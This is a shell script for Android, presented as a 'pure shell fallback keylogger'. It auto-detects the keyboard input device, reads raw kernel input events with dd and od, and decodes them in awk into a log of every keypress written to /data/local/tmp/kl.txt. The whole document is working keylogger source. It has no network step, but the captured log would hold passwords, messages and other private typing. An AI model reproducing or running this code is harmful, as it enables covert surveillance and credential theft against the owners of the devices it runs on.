#!/system/bin/sh
# =============================================================
# keylogger_sh.sh — Pure shell fallback keylogger
# For devices without Python. Uses dd + od to read raw events.
# =============================================================
# Reads input_event structs from /dev/input/eventX
# Decodes EV_KEY events using od (octal dump) and awk.
# Logs to /data/local/tmp/kl.txt
# =============================================================

EVENT_NODE="/dev/input/event0"
LOGFILE="/data/local/tmp/kl.txt"

# Auto-detect event node
DETECTED=$(awk '
  /^H:/ { handlers=$0 }
  /^B: EV=/ {
    cmd="printf \"0x" $3 "\" | xargs printf \"%d\""
    cmd | getline ev; close(cmd)
    if (int(ev) % 4 >= 2) {  # bit 1 set = EV_KEY
      n=split(handlers, a, " ")
      for(i=1;i<=n;i++) {
        if (a[i] ~ /^event[0-9]/) {
          print "/dev/input/" a[i]
          exit
        }
      }
    }
  }
' /proc/bus/input/devices 2>/dev/null)

[ -n "$DETECTED" ] && EVENT_NODE="$DETECTED"

echo "[*] Shell keylogger started on $EVENT_NODE" >> "$LOGFILE"
echo "[*] $(date)" >> "$LOGFILE"

# Determine struct size from arch
ARCH=$(uname -m)
case "$ARCH" in
  *64*) STRUCT_SIZE=24 ;;
  *)    STRUCT_SIZE=16 ;;
esac

# Read events in a loop using dd + od
# input_event layout (64-bit): [8B sec][8B usec][2B type][2B code][4B value]
# We skip timeval (16B) and read type(2)+code(2)+value(4) = 8 bytes
dd if="$EVENT_NODE" bs="$STRUCT_SIZE" 2>/dev/null | \
od -v -A n -t u2 -w"$STRUCT_SIZE" | \
awk -v logfile="$LOGFILE" '
  # Minimal keycode table
  BEGIN {
    k[2]="1"; k[3]="2"; k[4]="3"; k[5]="4"; k[6]="5";
    k[7]="6"; k[8]="7"; k[9]="8"; k[10]="9"; k[11]="0";
    k[12]="-"; k[13]="="; k[14]="[BS]"; k[15]="[TAB]";
    k[16]="q"; k[17]="w"; k[18]="e"; k[19]="r"; k[20]="t";
    k[21]="y"; k[22]="u"; k[23]="i"; k[24]="o"; k[25]="p";
    k[28]="[ENTER]"; k[30]="a"; k[31]="s"; k[32]="d";
    k[33]="f"; k[34]="g"; k[35]="h"; k[36]="j"; k[37]="k";
    k[38]="l"; k[44]="z"; k[45]="x"; k[46]="c"; k[47]="v";
    k[48]="b"; k[49]="n"; k[50]="m"; k[57]="[SPC]";
    k[103]="[UP]"; k[105]="[LEFT]"; k[106]="[RIGHT]"; k[108]="[DOWN]";
    k[116]="[PWR]"; k[139]="[MENU]"; k[158]="[BACK]"; k[172]="[HOME]";
  }
  {
    # od output for 24-byte struct (64-bit): 12 u16 values
    # fields: [0..7]=timeval, [8]=type, [9]=code, [10..11]=value(s32 as 2xu16)
    if (NF >= 10) {
      type  = $9
      code  = $10
      # value: two u16 little-endian → s32
      val_lo = $11; val_hi = $12
      value = val_lo + val_hi * 65536
      if (value >= 32768) value -= 65536  # sign extend

      if (type == 1 && (value == 1 || value == 2)) {  # EV_KEY, down/hold
        char = (code in k) ? k[code] : "[K" code "]"
        print char >> logfile
        fflush(logfile)
      }
    }
  }
'
